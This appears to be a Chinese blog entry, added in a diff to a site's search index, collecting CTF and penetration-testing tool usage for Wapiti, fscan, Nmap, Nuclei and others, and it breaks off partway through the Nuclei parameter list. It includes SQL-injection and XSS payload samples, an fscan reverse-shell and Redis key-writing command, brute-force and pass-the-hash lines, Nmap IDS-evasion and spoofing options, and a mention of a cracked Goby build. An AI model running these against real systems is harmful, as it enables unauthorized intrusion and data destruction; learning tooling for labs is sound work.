@@ -2342,4 +2342,345 @@
         <tag>前端开发</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CTF入门工具合集</title>
+    <url>/2025/11/17/10-34-45/</url>
+    <content><![CDATA[<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h2 id="Wapiti"><a href="#Wapiti" class="headerlink" title="Wapiti"></a>Wapiti</h2><p>一个强大的自动化漏洞扫描工具</p>
+<h3 id="一，安装"><a href="#一，安装" class="headerlink" title="一，安装"></a>一，安装</h3><h4 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h4><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用Python安装</span><br><span class="line">pip install wapiti3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描（最常用）</span><br><span class="line">wapiti -u http://target.com</span><br><span class="line"></span><br><span class="line"># 扫描并保存报告</span><br><span class="line">wapiti -u http://target.com -o scan_report</span><br><span class="line"></span><br><span class="line"># 查看报告（扫描完成后）</span><br><span class="line">firefox scan_report/index.html</span><br></pre></td></tr></table></figure>
+<h3 id="二，参数说明"><a href="#二，参数说明" class="headerlink" title="二，参数说明"></a>二，参数说明</h3><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">说明</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-u</code></td>
+<td align="left">目标URL</td>
+<td align="left"><code>wapiti -u http://target.com</code></td>
+</tr>
+<tr>
+<td align="left"><code>-o</code></td>
+<td align="left">输出目录</td>
+<td align="left"><code>-o ./reports</code></td>
+</tr>
+<tr>
+<td align="left"><code>-f</code></td>
+<td align="left">报告格式</td>
+<td align="left"><code>-f html</code></td>
+</tr>
+<tr>
+<td align="left"><code>-m</code></td>
+<td align="left">扫描模块</td>
+<td align="left"><code>-m &quot;sql,xss&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><code>-x</code></td>
+<td align="left">排除模块</td>
+<td align="left"><code>-x &quot;sql&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><code>-c</code></td>
+<td align="left">配置文件</td>
+<td align="left"><code>-c config.json</code></td>
+</tr>
+<tr>
+<td align="left"><code>-p</code></td>
+<td align="left">代理设置</td>
+<td align="left"><code>-p http://proxy:8080</code></td>
+</tr>
+<tr>
+<td align="left"><code>-t</code></td>
+<td align="left">超时时间</td>
+<td align="left"><code>-t 10</code></td>
+</tr>
+<tr>
+<td align="left"><code>-d</code></td>
+<td align="left">扫描深度</td>
+<td align="left"><code>-d 3</code></td>
+</tr>
+</tbody></table>
+<h3 id="三、基础使用教程"><a href="#三、基础使用教程" class="headerlink" title="三、基础使用教程"></a>三、基础使用教程</h3><h4 id="3-1-最简单的扫描命令"><a href="#3-1-最简单的扫描命令" class="headerlink" title="3.1 最简单的扫描命令"></a>3.1 最简单的扫描命令</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描（最常用）</span><br><span class="line">wapiti -u http://target.com</span><br><span class="line"></span><br><span class="line"># 扫描并保存报告</span><br><span class="line">wapiti -u http://target.com -o scan_report</span><br><span class="line"></span><br><span class="line"># 查看报告（扫描完成后）</span><br><span class="line">firefox scan_report/index.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、实战扫描步骤"><a href="#四、实战扫描步骤" class="headerlink" title="四、实战扫描步骤"></a>四、实战扫描步骤</h3><h4 id="4-1-第一步：快速漏洞扫描"><a href="#4-1-第一步：快速漏洞扫描" class="headerlink" title="4.1 第一步：快速漏洞扫描"></a>4.1 第一步：快速漏洞扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 完整漏洞扫描（默认所有模块）</span><br><span class="line">wapiti -u http://target.com -o target_scan</span><br><span class="line"></span><br><span class="line"># 扫描完成后查看报告</span><br><span class="line">ls target_scan/</span><br><span class="line"># 会生成index.html、report.html等文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-2-第二步：选择性漏洞扫描"><a href="#4-2-第二步：选择性漏洞扫描" class="headerlink" title="4.2 第二步：选择性漏洞扫描"></a>4.2 第二步：选择性漏洞扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只扫描SQL注入和XSS漏洞</span><br><span class="line">wapiti -u http://target.com -m &quot;sql,xss&quot; -o quick_scan</span><br><span class="line"></span><br><span class="line"># 排除特定漏洞类型</span><br><span class="line">wapiti -u http://target.com -x &quot;sql,backup&quot; -o clean_scan</span><br><span class="line"></span><br><span class="line"># 常用模块列表</span><br><span class="line"># sql - SQL注入</span><br><span class="line"># xss - 跨站脚本</span><br><span class="line"># backup - 备份文件</span><br><span class="line"># exec - 命令执行</span><br><span class="line"># file - 文件包含</span><br><span class="line"># htaccess - .htaccess配置</span><br><span class="line"># wp - WordPress漏洞</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-3-第三步：设置扫描深度和范围"><a href="#4-3-第三步：设置扫描深度和范围" class="headerlink" title="4.3 第三步：设置扫描深度和范围"></a>4.3 第三步：设置扫描深度和范围</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置扫描深度（默认1）</span><br><span class="line">wapiti -u http://target.com -d 3 -o deep_scan</span><br><span class="line"></span><br><span class="line"># 设置最大扫描页面数</span><br><span class="line">wapiti -u http://target.com --max-scan-per-module 100 -o limited_scan</span><br><span class="line"></span><br><span class="line"># 设置最大链接数</span><br><span class="line">wapiti -u http://target.com --max-links 2000 -o links_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-4-第四步：使用代理扫描"><a href="#4-4-第四步：使用代理扫描" class="headerlink" title="4.4 第四步：使用代理扫描"></a>4.4 第四步：使用代理扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用HTTP代理</span><br><span class="line">wapiti -u http://target.com -p http://127.0.0.1:8080 -o proxy_scan</span><br><span class="line"></span><br><span class="line"># 使用SOCKS代理</span><br><span class="line">wapiti -u http://target.com -p socks5://127.0.0.1:1080 -o socks_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="五、高级扫描技巧"><a href="#五、高级扫描技巧" class="headerlink" title="五、高级扫描技巧"></a>五、高级扫描技巧</h3><h4 id="5-1-认证扫描（登录扫描）"><a href="#5-1-认证扫描（登录扫描）" class="headerlink" title="5.1 认证扫描（登录扫描）"></a>5.1 认证扫描（登录扫描）</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：使用表单认证</span><br><span class="line">wapiti -u http://target.com -a login_data.txt -o auth_scan</span><br><span class="line"></span><br><span class="line"># login_data.txt内容示例：</span><br><span class="line"># &#123;&quot;login&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin123&quot;, &quot;url&quot;: &quot;http://target.com/login&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 方法2：使用cookies</span><br><span class="line">wapiti -u http://target.com --cookie &quot;session=abc123&quot; -o cookie_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-2-自定义payload扫描"><a href="#5-2-自定义payload扫描" class="headerlink" title="5.2 自定义payload扫描"></a>5.2 自定义payload扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用自定义payload文件</span><br><span class="line">wapiti -u http://target.com --payload /path/to/payloads.json -o custom_scan</span><br><span class="line"></span><br><span class="line"># payload文件示例格式</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sql&quot;: [</span><br><span class="line">    &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,</span><br><span class="line">    &quot;&#x27;; DROP TABLE users;--&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;xss&quot;: [</span><br><span class="line">    &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;,</span><br><span class="line">    &quot;&lt;img src=x onerror=alert(1)&gt;&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-3-批量扫描多个目标"><a href="#5-3-批量扫描多个目标" class="headerlink" title="5.3 批量扫描多个目标"></a>5.3 批量扫描多个目标</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：使用文本文件</span><br><span class="line"># targets.txt内容：</span><br><span class="line"># http://target1.com</span><br><span class="line"># http://target2.com</span><br><span class="line"></span><br><span class="line">wapiti -l targets.txt -o batch_scan</span><br><span class="line"></span><br><span class="line"># 方法2：扫描子域名</span><br><span class="line">wapiti -u http://target.com --scope folder -o folder_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5-4-设置请求头"><a href="#5-4-设置请求头" class="headerlink" title="5.4 设置请求头"></a>5.4 设置请求头</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 自定义User-Agent</span><br><span class="line">wapiti -u http://target.com -H &quot;User-Agent: Mozilla/5.0&quot; -o header_scan</span><br><span class="line"></span><br><span class="line"># 添加多个请求头</span><br><span class="line">wapiti -u http://target.com --headers headers.txt -o multi_header_scan</span><br><span class="line"></span><br><span class="line"># headers.txt内容：</span><br><span class="line"># User-Agent: Mozilla/5.0</span><br><span class="line"># X-Forwarded-For: 127.0.0.1</span><br><span class="line"># Authorization: Bearer token123</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="六、报告生成与分析"><a href="#六、报告生成与分析" class="headerlink" title="六、报告生成与分析"></a>六、报告生成与分析</h3><h4 id="6-1-生成不同格式的报告"><a href="#6-1-生成不同格式的报告" class="headerlink" title="6.1 生成不同格式的报告"></a>6.1 生成不同格式的报告</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># HTML报告（默认）</span><br><span class="line">wapiti -u http://target.com -f html -o html_report</span><br><span class="line"></span><br><span class="line"># JSON报告</span><br><span class="line">wapiti -u http://target.com -f json -o json_report</span><br><span class="line"></span><br><span class="line"># TXT报告</span><br><span class="line">wapiti -u http://target.com -f txt -o txt_report</span><br><span class="line"></span><br><span class="line"># XML报告</span><br><span class="line">wapiti -u http://target.com -f xml -o xml_report</span><br><span class="line"></span><br><span class="line"># 同时生成多种格式</span><br><span class="line">wapiti -u http://target.com -f &quot;html,json&quot; -o multi_report</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-2-报告内容解读"><a href="#6-2-报告内容解读" class="headerlink" title="6.2 报告内容解读"></a>6.2 报告内容解读</h4><p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成的报告包含：</span><br><span class="line">1. 漏洞摘要（按严重程度分类）</span><br><span class="line">2. 漏洞详情（每个漏洞的描述）</span><br><span class="line">3. 受影响的URL和参数</span><br><span class="line">4. 攻击载荷（payload）</span><br><span class="line">5. HTTP请求/响应示例</span><br><span class="line">6. 修复建议</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="6-3-快速查看扫描结果"><a href="#6-3-快速查看扫描结果" class="headerlink" title="6.3 快速查看扫描结果"></a>6.3 快速查看扫描结果</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看扫描状态</span><br><span class="line">cat scan_report/.history</span><br><span class="line"></span><br><span class="line"># 查看发现的漏洞数量</span><br><span class="line">grep -c &quot;vulnerability&quot; scan_report/report.html</span><br><span class="line"></span><br><span class="line"># 提取高风险漏洞</span><br><span class="line">grep -A5 &quot;High&quot; scan_report/report.html</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="七、常用扫描模板"><a href="#七、常用扫描模板" class="headerlink" title="七、常用扫描模板"></a>七、常用扫描模板</h3><h4 id="7-1-快速安全检测"><a href="#7-1-快速安全检测" class="headerlink" title="7.1 快速安全检测"></a>7.1 快速安全检测</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只检测常见高危漏洞</span><br><span class="line">wapiti -u http://target.com -m &quot;sql,xss,exec,file&quot; -o quick_check</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-2-全面漏洞扫描"><a href="#7-2-全面漏洞扫描" class="headerlink" title="7.2 全面漏洞扫描"></a>7.2 全面漏洞扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用所有模块（默认）</span><br><span class="line">wapiti -u http://target.com -o full_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-3-WordPress网站扫描"><a href="#7-3-WordPress网站扫描" class="headerlink" title="7.3 WordPress网站扫描"></a>7.3 WordPress网站扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># WordPress专用扫描</span><br><span class="line">wapiti -u http://target.com -m &quot;wp&quot; -o wp_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-4-API接口扫描"><a href="#7-4-API接口扫描" class="headerlink" title="7.4 API接口扫描"></a>7.4 API接口扫描</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 针对REST API的扫描</span><br><span class="line">wapiti -u http://target.com/api -m &quot;sql,xss,exec&quot; --scope folder -o api_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="八、实战示例"><a href="#八、实战示例" class="headerlink" title="八、实战示例"></a>八、实战示例</h3><h4 id="示例1：扫描测试网站DVWA"><a href="#示例1：扫描测试网站DVWA" class="headerlink" title="示例1：扫描测试网站DVWA"></a>示例1：扫描测试网站DVWA</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 扫描DVWA（需先启动DVWA服务）</span><br><span class="line">wapiti -u http://localhost/dvwa -o dvwa_scan</span><br><span class="line"></span><br><span class="line"># 使用认证扫描DVWA</span><br><span class="line">wapiti -u http://localhost/dvwa \</span><br><span class="line">  -a &#x27;&#123;&quot;login&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;password&quot;, &quot;url&quot;: &quot;http://localhost/dvwa/login.php&quot;&#125;&#x27; \</span><br><span class="line">  -o dvwa_auth_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="示例2：扫描包含登录的Web应用"><a href="#示例2：扫描包含登录的Web应用" class="headerlink" title="示例2：扫描包含登录的Web应用"></a>示例2：扫描包含登录的Web应用</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 步骤1：首先正常扫描</span><br><span class="line">wapiti -u http://target.com -o initial_scan</span><br><span class="line"></span><br><span class="line"># 步骤2：如果发现登录页面，使用认证扫描</span><br><span class="line">wapiti -u http://target.com \</span><br><span class="line">  --cookie &quot;sessionid=abc123def456&quot; \</span><br><span class="line">  -o authenticated_scan</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="示例3：限制扫描范围（避免误操作）"><a href="#示例3：限制扫描范围（避免误操作）" class="headerlink" title="示例3：限制扫描范围（避免误操作）"></a>示例3：限制扫描范围（避免误操作）</h4><p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只扫描指定目录</span><br><span class="line">wapiti -u http://target.com/admin --scope folder -o admin_scan</span><br><span class="line"></span><br><span class="line"># 排除某些路径</span><br><span class="line">wapiti -u http://target.com --exclude &quot;logout,delete&quot; -o safe_scan</span><br></pre></td></tr></table></figure>
+
+<h2 id="DudeSuite"><a href="#DudeSuite" class="headerlink" title="DudeSuite"></a>DudeSuite</h2><p>一款渗透测试工具集</p>
+<p>集成请求重放、漏洞验证、端口扫描、密码爆破、shell管理、fofa、编解码等实用工具</p>
+<p><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2FYLKhV1zm0uiczV2K03vH%2Fimage.png?alt=media&#x26;token=f8449b07-df7f-4331-bf10-e717674701b1" alt="img"></p>
+<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
+<p>简单用法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/16  (B段扫描)</span><br></pre></td></tr></table></figure>
+
+<p>其他用法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line">fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class="line">fscan.exe -hf ip.txt  (以文件导入)</span><br><span class="line">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>红队破解版，有很多公开的红队POC可以自行集成</p>
+<figure><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2F1bUaoUgpw5a1AB77HitB%2Fimage.png?alt=media&#x26;token=53e026fb-a512-4033-9cb6-4a36e0f2d9cd" alt=""><figcaption></figcaption></figure>
+
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>1. nmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢</p>
+<p>2. nmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快</p>
+<p>3. nmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描</p>
+<p>4. nmap -sU 192.168.96.4  &#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020">UDP</a>扫描,慢,可得到有价值的服务器程序</p>
+<p>5. nmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包</p>
+<p>6. nmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽</p>
+<p>7. nmap 192.168.96.4 -p &lt;portnumber&gt;  &#x2F;&#x2F;对指定端口扫描</p>
+<p>8. nmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描</p>
+<p>9. nmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml</p>
+<p>10. nmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。</p>
+<p>11. nmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描</p>
+<p>12. nmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描</p>
+<p>13. nmap -sC &lt;scirptfile&gt; 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长</p>
+<p>14. nmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长</p>
+<p>15. nmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描</p>
+<p>16. nmap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出</p>
+<p>17. nmap –mtu &lt;size&gt; 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数</p>
+<p>18. nmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测</p>
+<p>19. nmap –source-port &lt;portnumber&gt; &#x2F;&#x2F;针对防火墙只允许的源端口</p>
+<p>20. nmap –data-length: &lt;length&gt; 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。</p>
+<p>21. nmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)</p>
+<p>22. nmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）</p>
+<p>23. nmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。</p>
+<p>24. nmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要</p>
+<p>25. nmap –system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器</p>
+<p>26. nmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。</p>
+<p>27. nmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。</p>
+<p>28. nmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。</p>
+<p>29. nmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。</p>
+<h3 id="防火墙-x2F-IDS逃逸-amp-x20"><a href="#防火墙-x2F-IDS逃逸-amp-x20" class="headerlink" title="防火墙&#x2F;IDS逃逸&amp;#x20;"></a>防火墙&#x2F;IDS逃逸&amp;#x20;</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -f --mtu=16 192.168.0.8</span><br><span class="line">#报文分段，mtu必须是8的倍数</span><br><span class="line"></span><br><span class="line">nmap -sI www.0day.com:80 192.168.0.8	</span><br><span class="line">#源IP欺骗</span><br><span class="line"></span><br><span class="line">nmap --source-port 53 192.168.0.8		</span><br><span class="line">#源端口欺骗</span><br><span class="line">#防火墙对服务器的设置会根据端口选择是否信任数据流</span><br><span class="line">#管理员可能会认为这些端口不会有攻击发生，所以可以利用这些端口扫描</span><br><span class="line"></span><br><span class="line">nmap --data-length 30 192.168.0.8</span><br><span class="line">#在原来报文基础上，附加随机数据，达到规避防火墙的效果</span><br><span class="line"></span><br><span class="line">nmap --spoof-mac 0 192.168.0.8</span><br><span class="line">#指定一个随机的MAC地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="返回说明"><a href="#返回说明" class="headerlink" title="返回说明"></a>返回说明</h3><h4 id="端口状态说明"><a href="#端口状态说明" class="headerlink" title="端口状态说明"></a>端口状态说明</h4><p><strong>open(开放的)</strong></p>
+<p>应用程序正在该端口接收TCP 连接或者UDP报文。</p>
+<p><strong>closed(关闭的)</strong></p>
+<p>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。</p>
+<p><strong>filtered(被过滤的)</strong></p>
+<p>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。</p>
+<p>过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。</p>
+<p><strong>unfiltered(未被过滤的)</strong></p>
+<p>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。</p>
+<p>只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。</p>
+<p>用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p>
+<p><strong>open|filtered(开放或者被过滤的)</strong></p>
+<p>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。</p>
+<p>开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。</p>
+<p>因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p>
+<p><strong>closed|filtered(关闭或者被过滤的)</strong></p>
+<p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p>
+<h4 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h4><p><strong>TCP连接扫描</strong></p>
+<p>使用操作系统的网络连接系统调用 connect()，对目标主机发起 TCP 三路握手，待完成后 Nmap 立即中断此次连接。</p>
+<p>Nmap 通过获取每个尝试连接的状态信息来判定侦测端口的状态</p>
+<p><strong>SYN扫描</strong></p>
+<p>Nmap 产生一个 SYN 数据报文，如果侦测端口开放并返回 SYN-ACK 响应报文</p>
+<p>Nmap 据此发送 RST 报文给侦测端口结束当前连接，这样做的好处在于缩短了端口扫描时间</p>
+<p><strong>UDP扫描</strong></p>
+<p>UDP 本身是无连接的协议，Nmap 向目标主机的端口发送 UDP 探测报文</p>
+<p>如果端口没有开放，被侦测主机将会发送一个 ICMP 端口不可到达的消息</p>
+<p>Nmap 根据这个消息确定端口闭合（closed）或者被过滤 (unfiltered)</p>
+<p>通常没有回复意味着端口是开放（open）状态 。</p>
+<p><strong>ACK扫描</strong></p>
+<p>这种扫描比较特殊，它不能确切知道端口的基本状态，而是主要用来探测防火墙是否存在以及其中设定的过滤规则</p>
+<p><strong>FIN扫描</strong></p>
+<p>和 SYN 扫描相比，这种方式更为隐蔽，因此能够穿过防火墙的过滤</p>
+<p>关闭（closed）端口将会返回合适的 RST 报文，而开放端口将忽略这样的侦测报文</p>
+<p>具备类似防火墙不敏感特性的还有 -sN NULL 扫描，-sX X-mas 扫描。</p>
+<h2 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h2><p>Nuclei是一个基于模板的、可配置攻击目标的扫描快速工具，同时还提供了强大的可扩展性和易用性。</p>
+<h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>-c 并发请求数（默认10）nuclei -c 100</p>
+<p>-timeout 超时时间(默认为5秒) nuclei -timeout 5&amp;#x20;</p>
+<p>-proxy-url 输入代理地址 nuclei -proxy-url hxxp:&#x2F;&#x2F;127.0.0.1:8080&amp;#x20;</p>
+<p>-proxy-socks-url 输入socks代理地址 nuclei -proxy-socks-url socks5:&#x2F;&#x2F;user:pass@Your IP:1080&amp;#x20;</p>
+<p>-random-agent 使用随机的UA nuclei -random-agent&amp;#x20;</p>
+<p>-H 自定义请求头 nuclei -H “x-bug-bounty:hacker”&amp;#x20;</p>
+<p>-update-templates 下载或者升级模板  nuclei -update-templates&amp;#x20;</p>
+<p>nuclei -t test.yaml –validate 验证模板格式</p>
+<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a>  指定模板和目标</p>
+<p>nuclei -t test.yaml -l target.txt  批量扫描</p>
+<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a> -p socks5:&#x2F;&#x2F;127.0.0.1:7890 指定代理</p>
+<p>nuclei -t test.yaml -l target.txt -stats Debug  查看扫描进度</p>
+<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a> -debug查看发送数据包和返回包</p>
+<h3 id="全部参数"><a href="#全部参数" class="headerlink" title="全部参数"></a>全部参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nuclei -h</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">  nuclei [命令]</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">目标：</span><br><span class="line">   -u, -target string[]                 指定扫描的URL/主机</span><br><span class="line">   -l, -list string                     指定需要扫描的URL/主机文件（一行一个）</span><br><span class="line"></span><br><span class="line">模板：</span><br><span class="line">   -t, -templates string[]              指定需要扫描的模板或者模板的路径</span><br><span class="line">   -nt, -new-templates                  只扫描最新版本中添加的模板</span><br><span class="line">   -w, -workflows string[]              指定扫描中的工作流或者工作流目录</span><br><span class="line">   -validate                            验证通过的模板</span><br><span class="line">   -tl                                  列出所有可用的模板</span><br><span class="line"></span><br><span class="line">过滤：</span><br><span class="line">   -tags string[]                       